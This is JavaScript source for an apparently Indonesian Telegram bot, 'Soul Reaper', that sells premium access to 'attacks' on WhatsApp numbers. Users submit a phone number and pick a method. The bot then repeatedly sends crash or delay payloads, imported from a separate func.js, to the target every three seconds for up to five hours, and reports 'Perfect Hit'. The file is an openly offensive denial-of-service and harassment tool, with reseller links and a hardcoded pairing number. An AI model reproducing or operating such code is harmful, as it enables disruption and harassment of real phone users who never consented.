const {
        Telegraf,
        Markup
} = require("telegraf");
const fs = require('fs');
const {
        default: makeWASocket,
        useMultiFileAuthState,
        downloadContentFromMessage,
        emitGroupParticipantsUpdate,
        emitGroupUpdate,
        generateWAMessageContent,
        generateWAMessage,
        makeInMemoryStore,
        prepareWAMessageMedia,
        generateWAMessageFromContent,
        MediaType,
        areJidsSameUser,
        WAMessageStatus,
        downloadAndSaveMediaMessage,
        AuthenticationState,
        GroupMetadata,
        initInMemoryKeyStore,
        getContentType,
        MiscMessageGenerationOptions,
        useSingleFileAuthState,
        BufferJSON,
        WAMessageProto,
        MessageOptions,
        WAFlag,
        WANode,
        WAMetric,
        ChatModification,
        MessageTypeProto,
        WALocationMessage,
        ReconnectMode,
        WAContextInfo,
        proto,
        WAGroupMetadata,
        ProxyAgent,
        waChatKey,
        MimetypeMap,
        MediaPathMap,
        WAContactMessage,
        WAContactsArrayMessage,
        WAGroupInviteMessage,
        WATextMessage,
        WAMessageContent,
        WAMessage,
        BaileysError,
        WA_MESSAGE_STATUS_TYPE,
        MediaConnInfo,
        URL_REGEX,
        WAUrlInfo,
        WA_DEFAULT_EPHEMERAL,
        WAMediaUpload,
        jidDecode,
        mentionedJid,
        processTime,
        Browser,
        MessageType,
        Presence,
        WA_MESSAGE_STUB_TYPES,
        Mimetype,
        relayWAMessage,
        Browsers,
        GroupSettingChange,
        DisconnectReason,
        WASocket,
        getStream,
        WAProto,
        isBaileys,
        AnyMessageContent,
        fetchLatestBaileysVersion,
        templateMessage,
        InteractiveMessage,
        Header
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const {
        BOT_TOKEN,
        allowedDevelopers
} = require("./config");
const tdxlol = fs.readFileSync('./tdx.jpeg');
const crypto = require('crypto');
const o = fs.readFileSync(`./o.jpg`)
const bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 9_000_000 });

// Import fungsi dari func.js
const { DileyHard, soulz, AboutYou, sleep } = require('./func');

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
let bydaah = null;
let isWhatsAppConnected = false;
const usePairingCode = true; 
let maintenanceConfig = {
        maintenance_mode: false,
        message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
let whatsappUserInfo = null;
let bugCooldown = 0; 
let userLastAttack = new Map(); 

const isOwner = (userId) => {
        if (ownerList.includes(userId.toString())) {
                ownerataubukan = "✅";
                return true;
        } else {
                ownerataubukan = "❌";
                return false;
        }
};
const OWNER_ID = (userId) => {
        if (allowedDevelopers.includes(userId.toString())) {
                ysudh = "✅";
                return true;
        } else {
                gnymbung = "❌";
                return false;
        }
};
const isAdmin = (userId) => {
        if (adminList.includes(userId.toString())) {
                adminataubukan = "✅";
                return true;
        } else {
                adminataubukan = "❌";
                return false;
        }
};
const addAdmin = (userId) => {
        if (!adminList.includes(userId)) {
                adminList.push(userId);
                saveAdmins();
        }
};
const removeAdmin = (userId) => {
        adminList = adminList.filter(id => id !== userId);
        saveAdmins();
};
const saveAdmins = () => {
        fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};
const loadAdmins = () => {
        try {
                const data = fs.readFileSync('./admins.json');
                adminList = JSON.parse(data);
        } catch (error) {
                console.error(chalk.red('Gagal memuat daftar admin:'), error);
                adminList = [];
        }
};
function checkCooldown(userId) {
        if (!userLastAttack.has(userId)) {
                return {
                        canAttack: true,
                        remainingTime: 0
                };
        }
        const lastAttack = userLastAttack.get(userId);
        const now = Date.now();
        const timePassed = (now - lastAttack) / 1000; 
        if (timePassed < bugCooldown) {
                return {
                        canAttack: false,
                        remainingTime: Math.ceil(bugCooldown - timePassed)
                };
        }
        return {
                canAttack: true,
                remainingTime: 0
        };
}
const isPremiumUser = (userId) => {
        const userData = premiumUsers[userId];
        if (!userData) {
                Premiumataubukan = "❌";
                return false;
        }
        const now = moment().tz('Asia/Jakarta');
        const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');
        if (now.isBefore(expirationDate)) {
                Premiumataubukan = "✅";
                return true;
        } else {
                Premiumataubukan = "❌";
                return false;
        }
};
const loadPremiumUsers = () => {
        try {
                if (fs.existsSync('./premiumUsers.json')) {
                        const data = fs.readFileSync('./premiumUsers.json', 'utf8');
                        premiumUsers = JSON.parse(data);
                } else {
                        premiumUsers = {};
                        savePremiumUsers();
                }
        } catch (error) {
                console.error('Error loading premium users:', error);
                premiumUsers = {};
        }
};
const savePremiumUsers = () => {
        try {
                const safeData = {};
                for (const [userId, userData] of Object.entries(premiumUsers)) {
                        safeData[userId] = {
                                expired: userData.expired
                        };
                }
                const jsonString = JSON.stringify(safeData, null, 2);
                fs.writeFileSync('./premiumUsers.json', jsonString);
        } catch (error) {
                console.error('Error saving premium users:', error);
        }
};
const addPremiumUser = (userId, durationDays) => {
        try {
                if (!userId || !durationDays) {
                        throw new Error('Invalid user ID or duration');
                }
                const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
                premiumUsers[userId] = {
                        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
                };
                savePremiumUsers();
        } catch (error) {
                console.error('Error adding premium user:', error);
                throw error;
        }
};
const loadDeviceList = () => {
        try {
                const data = fs.readFileSync('./ListDevice.json');
                deviceList = JSON.parse(data);
        } catch (error) {
                console.error(chalk.red('Gagal memuat daftar device:'), error);
                deviceList = [];
        }
};
const saveDeviceList = () => {
        fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};
const addDeviceToList = (userId, token) => {
        const deviceNumber = deviceList.length + 1;
        deviceList.push({
                number: deviceNumber,
                userId: userId,
                token: token
        });
        saveDeviceList();
        console.log(chalk.white.bold(`
╭─────────────────
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰─────────────────`));
};
const recordUserActivity = (userId, userNickname) => {
        const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
        userActivity[userId] = {
                nickname: userNickname,
                last_seen: now
        };
        fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};
const loadUserActivity = () => {
        try {
                const data = fs.readFileSync('./userActivity.json');
                userActivity = JSON.parse(data);
        } catch (error) {
                console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
                userActivity = {};
        }
};
const checkMaintenance = async (ctx, next) => {
        let userId, userNickname;
        if (ctx.from) {
                userId = ctx.from.id.toString();
                userNickname = ctx.from.first_name || userId;
        } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
                userId = ctx.update.channel_post.sender_chat.id.toString();
                userNickname = ctx.update.channel_post.sender_chat.title || userId;
        }
        if (userId) {
                recordUserActivity(userId, userNickname);
        }
        if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
                console.log("Pesan Maintenance:", maintenanceConfig.message);
                const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); 
                return await ctx.replyWithMarkdown(escapedMessage);
        } else {
                await next();
        }
};
const checkPremium = async (ctx, next) => {
        if (isPremiumUser(ctx.from.id)) {
                await next();
        } else {
                await ctx.reply("❌ Maaf, fitur ini hanya untuk pengguna Premium!");
        }
};
const checkWhatsAppConnection = async (ctx, next) => {
        if (!isWhatsAppConnected) {
                await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
                return;
        }
        await next();
};

function formatPhoneNumber(number) {
        let cleaned = number.replace(/[^0-9]/g, '');
        return cleaned;
}

async function prosesrespone(target, ctx) {
        const message = `
╭═══════『 𝐏𝐑𝐎𝐒𝐄𝐒 』═══════⊱
│
├─────『 𝐈𝐍𝐅𝐎 』
│ • Status: Sedang Dikirim... 🚀
│ • Target: ${target}
│ • Status: Perfect Hit ✅
│
╰═════════════════════⊱`;
        if (ctx.updateType === 'callback_query') {
            await ctx.reply(message, { reply_to_message_id: ctx.update.callback_query.message.message_id });
        } else {
            await ctx.reply(message, { reply_to_message_id: ctx.message.message_id });
        }
}

async function donerespone(target, ctx) {
        const message = `
╭═══════『 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』═══════⊱
│
├─────『 𝐈𝐍𝐅𝐎 』
│ • Status: Berhasil Dikirim ✅
│ • Target: ${target}
│ • Status: Perfect Hit ✅
│
╰═════════════════════⊱`;
        if (ctx.updateType === 'callback_query') {
            await ctx.reply(message, { reply_to_message_id: ctx.update.callback_query.message.message_id });
        } else {
            await ctx.reply(message, { reply_to_message_id: ctx.message.message_id });
        }
}

function parseDuration(input) {
    let durationMs = 0;
    if (input.endsWith('m')) {
        const minutes = parseInt(input.replace('m', ''));
        if (!isNaN(minutes) && minutes >= 1) durationMs = minutes * 60 * 1000;
    } else if (input.endsWith('j')) {
        const hours = parseInt(input.replace('j', ''));
        if (!isNaN(hours) && hours >= 1 && hours <= 5) durationMs = hours * 60 * 60 * 1000;
    }
    return durationMs;
}

const startSesi = async () => {
        const {
                state,
                saveCreds
        } = await useMultiFileAuthState('sesi-wa');
        const {
                version,
                isLatest
        } = await fetchLatestBaileysVersion();
        console.log(chalk.white.bold(`
╭─────────────────
┃ ${chalk.white.bold('WHATSAPP CONNECTION')}
┃ ${chalk.white.bold('VERSION: ')} ${chalk.yellow.bold(version.join('.'))}
┃ ${chalk.white.bold('LATEST: ')} ${chalk.yellow.bold(isLatest)}
╰─────────────────`));
        bydaah = makeWASocket({
                version,
                logger: pino({
                        level: 'silent'
                }),
                printQRInTerminal: !usePairingCode,
                auth: state,
                browser: Browsers.ubuntu('Chrome'),
        });
        if (usePairingCode && !state.creds.registered) {
                const phoneNumber = "6283843151551"; 
                setTimeout(async () => {
                        let code = await bydaah.requestPairingCode(phoneNumber);
                        code = code?.match(/.{1,4}/g)?.join("-") || code;
                        console.log(chalk.white.bold(`
╭─────────────────
┃ ${chalk.white.bold('PAIRING CODE')}
┃ ${chalk.yellow.bold(code)}
╰─────────────────`));
                }, 3000);
        }
        bydaah.ev.on('creds.update', saveCreds);
        bydaah.ev.on('connection.update', async (update) => {
                const {
                        connection,
                        lastDisconnect
                } = update;
                if (connection === 'close') {
                        const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut;
                        console.log('Connection closed due to ', lastDisconnect.error, ', reconnecting ', shouldReconnect);
                        if (shouldReconnect) {
                                startSesi();
                        }
                } else if (connection === 'open') {
                        console.log(chalk.white.bold(`
╭─────────────────
┃ ${chalk.green.bold('WHATSAPP CONNECTED')}
╰─────────────────`));
                        isWhatsAppConnected = true;
                        whatsappUserInfo = bydaah.user;
                }
        });
};

(async () => {
        console.log(chalk.whiteBright.bold(`
╭──────────────────────────────────────────────╮
│                                              │
│     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄     │
│     ████████████████████████████████████     │    
│     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀     │
│                                              │
│        Welcome to Soul Crack         │
│     @zihardev    │
│                                              │
╰──────────────────────────────────────────────╯
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃        SUKSES MEMUAT DATABASE OWNER          ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));
        loadPremiumUsers();
        loadAdmins();
        loadDeviceList();
        loadUserActivity();
        startSesi();
})();

bot.use(checkMaintenance);

bot.on('text', checkWhatsAppConnection, checkPremium, async (ctx) => {
    const text = ctx.message.text;
    if (text.startsWith('/')) return; 

    if (/^\+?[0-9]+$/.test(text)) {
        const nomorFix = formatPhoneNumber(text);
        const keyboard = [
            [
                { text: "DELAY", callback_data: `attack_delay_${nomorFix}` },
                { text: "soulz", callback_data: `attack_xfc_${nomorFix}` },
                { text: "xandro2", callback_data: `attack_xandro2_${nomorFix}` },
                { text: "xandro", callback_data: `attack_xandro_${nomorFix}` }
            ]
        ];
        
        return await ctx.reply(`🎯 *Target Terdeteksi:* +${nomorFix}\n\nSilakan pilih metode serangan di bawah ini (Durasi: 10 Menit):`, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard },
            reply_to_message_id: ctx.message.message_id
        });
    }
});

bot.action(/attack_(delay|xfc|xandro2|xandro)_(.+)/, checkWhatsAppConnection, checkPremium, async (ctx) => {
    const method = ctx.match[1];
    const nomorFix = ctx.match[2];
    const target = nomorFix + "@s.whatsapp.net";
    const userId = ctx.from.id;
    
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.answerCbQuery(`⏳ Cooldown: ${cooldownStatus.remainingTime} detik lagi`, { show_alert: true });
    }
    
    await ctx.answerCbQuery(`🚀 Memulai serangan ${method} ke ${nomorFix} (10m)...`);
    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());
    
    const durationMs = 10 * 60 * 1000; // Default 10 menit untuk button (Fixed)
    const endTime = Date.now() + durationMs;
    
    const runAttack = async () => {
        try {
            while (Date.now() < endTime) {
                if (!isWhatsAppConnected) break;
                if (method === 'delay') await DileyHard(bydaah, target, true);
                else if (method === 'xfc') await soulz(bydaah, target);
                else if (method === 'xandro2') await AboutYou(bydaah, target, true);
                else if (method === 'xandro') await AboutYou(bydaah, target);
                await sleep(3000);
            }
            await donerespone(target, ctx);
        } catch (error) {
            console.error(`Attack Error (${method}):`, error);
        }
    };
    runAttack();
});

const handleAttackCommand = async (ctx, method) => {
    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        return await ctx.reply(`
╭═══════⟨ 𝐂𝐚𝐫𝐚 𝐏𝐚𝐤𝐞 ⟩━━━━━━━╮
│
│ • /${method} 628xxx 1m   (1 menit)
│ • /${method} 628xxx 1j   (1 jam)
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Support 0/62/+62
│ • Max durasi: 5 jam (5j)
│ • Jeda per pesan: 3 detik
│
╰═════════════════════⊱`, { reply_to_message_id: ctx.message.message_id });
    }

    const userId = ctx.from.id;
    const cooldownStatus = checkCooldown(userId);
    if (!cooldownStatus.canAttack) {
        return await ctx.reply(`⏳ Cooldown: ${cooldownStatus.remainingTime} detik lagi`, { reply_to_message_id: ctx.message.message_id });
    }

    let durationMs = 5 * 60 * 1000; // Default 5 menit jika tidak ada argumen waktu
    if (args.length >= 3) {
        const customDuration = parseDuration(args[2].toLowerCase());
        if (customDuration > 0) {
            durationMs = customDuration;
        } else {
            return await ctx.reply("❌ Format waktu salah! Gunakan 'm' (menit) atau 'j' (jam, max 5j).", { reply_to_message_id: ctx.message.message_id });
        }
    }

    const nomorFix = formatPhoneNumber(args[1]);
    const target = nomorFix + "@s.whatsapp.net";
    
    await prosesrespone(target, ctx);
    userLastAttack.set(userId, Date.now());

    const endTime = Date.now() + durationMs;
    const runAttack = async () => {
        try {
            while (Date.now() < endTime) {
                if (!isWhatsAppConnected) break;
                if (method === 'delay') await DileyHard(bydaah, target, true);
                else if (method === 'xfc') await soulz(bydaah, target);
                else if (method === 'xandro2') await AboutYou(bydaah, target, true);
                else if (method === 'xandro') await AboutYou(bydaah, target);
                await sleep(3000);
            }
            await donerespone(target, ctx);
        } catch (error) {
            console.error(`Attack Error (${method}):`, error);
        }
    };
    runAttack();
};

bot.command("delay", checkWhatsAppConnection, checkPremium, ctx => handleAttackCommand(ctx, 'delay'));
bot.command("xfc", checkWhatsAppConnection, checkPremium, ctx => handleAttackCommand(ctx, 'xfc'));
bot.command("xandro2", checkWhatsAppConnection, checkPremium, ctx => handleAttackCommand(ctx, 'xandro2'));
bot.command("xandro", checkWhatsAppConnection, checkPremium, ctx => handleAttackCommand(ctx, 'xandro'));

bot.command("addowner", async (ctx) => {
        if (!OWNER_ID(ctx.from.id)) return;
        const args = ctx.message.text.split(/\s+/);
        if (args.length < 2) return ctx.reply("Gunakan: /addowner <id_user>");
        const newOwnerId = args[1];
        if (!ownerList.includes(newOwnerId)) {
                ownerList.push(newOwnerId);
                fs.writeFileSync('./owners.json', JSON.stringify(ownerList));
                await ctx.reply(`✅ User ${newOwnerId} berhasil ditambahkan sebagai Owner.`);
        } else {
                await ctx.reply("❌ User tersebut sudah menjadi Owner.");
        }
});

bot.command("delowner", async (ctx) => {
        if (!OWNER_ID(ctx.from.id)) return;
        const args = ctx.message.text.split(/\s+/);
        if (args.length < 2) return ctx.reply("Gunakan: /delowner <id_user>");
        const ownerIdToRemove = args[1];
        ownerList = ownerList.filter(id => id !== ownerIdToRemove);
        fs.writeFileSync('./owners.json', JSON.stringify(ownerList));
        await ctx.reply(`✅ User ${ownerIdToRemove} berhasil dihapus dari daftar Owner.`);
});

bot.command("addadmin", async (ctx) => {
        if (!isOwner(ctx.from.id) && !OWNER_ID(ctx.from.id)) return;
        const args = ctx.message.text.split(/\s+/);
        if (args.length < 2) return ctx.reply("Gunakan: /addadmin <id_user>");
        addAdmin(args[1]);
        await ctx.reply(`✅ User ${args[1]} berhasil ditambahkan sebagai Admin.`);
});

bot.command("deladmin", async (ctx) => {
        if (!isOwner(ctx.from.id) && !OWNER_ID(ctx.from.id)) return;
        const args = ctx.message.text.split(/\s+/);
        if (args.length < 2) return ctx.reply("Gunakan: /deladmin <id_user>");
        removeAdmin(args[1]);
        await ctx.reply(`✅ User ${args[1]} berhasil dihapus dari daftar Admin.`);
});

bot.command("addprem", async (ctx) => {
        if (!isAdmin(ctx.from.id) && !isOwner(ctx.from.id) && !OWNER_ID(ctx.from.id)) return;
        const args = ctx.message.text.split(/\s+/);
        if (args.length < 3) return ctx.reply("Gunakan: /addprem <id_user> <hari>");
        addPremiumUser(args[1], parseInt(args[2]));
        await ctx.reply(`✅ User ${args[1]} berhasil ditambahkan sebagai Premium selama ${args[2]} hari.`);
});

bot.command("delprem", async (ctx) => {
        if (!isAdmin(ctx.from.id) && !isOwner(ctx.from.id) && !OWNER_ID(ctx.from.id)) return;
        const args = ctx.message.text.split(/\s+/);
        if (args.length < 2) return ctx.reply("Gunakan: /delprem <id_user>");
        delete premiumUsers[args[1]];
        savePremiumUsers();
        await ctx.reply(`✅ User ${args[1]} berhasil dihapus dari daftar Premium.`);
});

bot.command("maintenance", async (ctx) => {
        if (!OWNER_ID(ctx.from.id)) return;
        maintenanceConfig.maintenance_mode = !maintenanceConfig.maintenance_mode;
        await ctx.reply(`✅ Maintenance mode: ${maintenanceConfig.maintenance_mode ? "ON" : "OFF"}`);
});

bot.start(async (ctx) => {
  await ctx.telegram.sendChatAction(ctx.chat.id, "typing");
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  const NgentodEnak = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│⚡ *𝐂𝐫𝐞𝐚𝐭𝐨𝐫*: @zihardev
│🚀 *𝐕𝐞𝐫𝐬𝐢𝐨𝐧*: 1
│⭐ *𝐀𝐝𝐦𝐢𝐧*: ${isAdminStatus ? "✅" : "❌"}
│💎 *𝐏𝐫𝐞𝐦𝐢𝐮𝐦*: ${isPremium ? "✅" : "❌"}
│👑 *𝐎𝐰𝐧𝐞𝐫*: ${isOwnerStatus ? "✅" : "❌"}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘 ! @zihardev
`;
  const imageUrl = "https://files.catbox.moe/rn570i.jpg";
  const keyboard = [
    [
      { text: "📱 MENU DEV", callback_data: "soultampleng" },
      { text: "🐞 MENU", callback_data: "bugmen" },
      { text: "👑 ADM MENU", callback_data: "ulznxx" },
      { text: "SI GANTENG CIHUY", url: "https://t.me/zihardev" },
    ],
  ];
  await ctx.replyWithPhoto(imageUrl, {
    caption: NgentodEnak,
    reply_markup: { inline_keyboard: keyboard },
    reply_to_message_id: ctx.message.message_id,
  });
});

bot.action('soultampleng', async (ctx) => {
        ctx.answerCbQuery();
        const menu = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
│◈ /addadmin  »  System Admin Control
│◈ /deladmin  »  Remove Admin Access  
│◈ /cekusersc »  System Usage Monitor
│◈ /monitoruser » User Activity Track
│◈ /addpairing » Connect WhatsApp
│◈ /maintenance » System Lock
│◈ /removeallbot » Remove Bot / Sender
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
        const keyboard = [
                [{
                        text: "RESELLER",
                        url: "https://t.me/zihardev"
                }]
        ];
        await ctx.editMessageCaption(menu, {
                parse_mode: "Markdown",
                reply_markup: {
                        inline_keyboard: keyboard
                }
        });
});

bot.action('ulznxx', async (ctx) => {
        ctx.answerCbQuery();
        const ULZZZZZZZZZZ = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
│◈/addprem  »  Grant Premium Power
│◈/delprem  »  Revoke Premium Access
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
        const keyboard = [
                [{
                        text: "RESELLER",
                        url: "https://t.me/zihardev"
                }]
        ];
        await ctx.editMessageCaption(ULZZZZZZZZZZ, {
                parse_mode: "Markdown",
                reply_markup: {
                        inline_keyboard: keyboard
                }
        });
});

bot.action('bugmen', async (ctx) => {
        const isPremium = isPremiumUser(ctx.from.id);
        const Zee = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
├─────⟨ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 ⟩
│ • /delay ⚡ (DILEY HARD)
│ • /xfc 🔥 (soulz)
│ • /xandro2 🐞 (mbg.js)
│ • /xandro ⚡ (AboutYou)
│
├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
│ • Premium: ${isPremium ? '✅ Active' : '❌ Not Active'}
│ • Cooldown: ${bugCooldown} detik
├─────『 𝐈𝐍𝐅𝐎 』
│
│ • Masukkan nomor langsung untuk menu button
│ • Semua command mendukung durasi (m/j)
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
        const keyboard = [
                [{
                        text: "RESELLER",
                        url: "https://t.me/zihardev"
                }],
                [{
                        text: "💎 PREMIUM ACCESS",
                        callback_data: "premiuminfo"
                }]
        ];
        await ctx.editMessageCaption(Zee, {
                parse_mode: "Markdown",
                reply_markup: {
                        inline_keyboard: keyboard
                }
        });
});

bot.command('bugmen', async (ctx) => {
        const isPremium = isPremiumUser(ctx.from.id);
        const imageUrl2 = "https://files.catbox.moe/rn570i.jpg";
        const Zee1 = `
╭━━━━━━━⟨ 𓇼 𝓢𝓞𝓤𝓛 𝓡𝓔𝓐𝓟𝓔𝓡  𓇼 ⟩━━━━━━━╮
│
├─────⟨ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒 ⟩
│ • /delay ⚡ (DILEY HARD)
│ • /xfc 🔥 (soulz)
│ • /xandro2 🐞 (mbg.js)
│ • /xandro ⚡ (AboutYou)
│
├─────『 𝐒𝐓𝐀𝐓𝐔𝐒 』
│ • Premium: ${isPremium ? '✅ Active' : '❌ Not Active'}
│ • Cooldown: ${bugCooldown} detik
├─────『 𝐈𝐍𝐅𝐎 』
│
│ • Masukkan nomor langsung untuk menu button
│ • Semua command mendukung durasi (m/j)
│
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱
» © 𐊖𐊒𐌵𐎘
`;
        const keyboard = [
                [{
                        text: "RESELLER",
                        url: "https://t.me/zihardev"
                }],
                [{
                        text: "💎 PREMIUM ACCESS",
                        callback_data: "premiuminfo"
                }]
        ];
        await ctx.replyWithPhoto(imageUrl2, {
                caption: Zee1,
                reply_markup: {
                        inline_keyboard: keyboard
                },
                reply_to_message_id: ctx.message.message_id
        });
});

bot.launch({ dropPendingUpdates: true })
    .then(() => {
        console.log("𝕾𝖔𝖚𝖑 𝖛𝟙 𝖌𝖊𝖓𝟚 | @bydaa");
    })
    .catch((err) => {
        console.error("Error starting bot:", err);
        setTimeout(() => process.exit(1), 5000);
    });
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
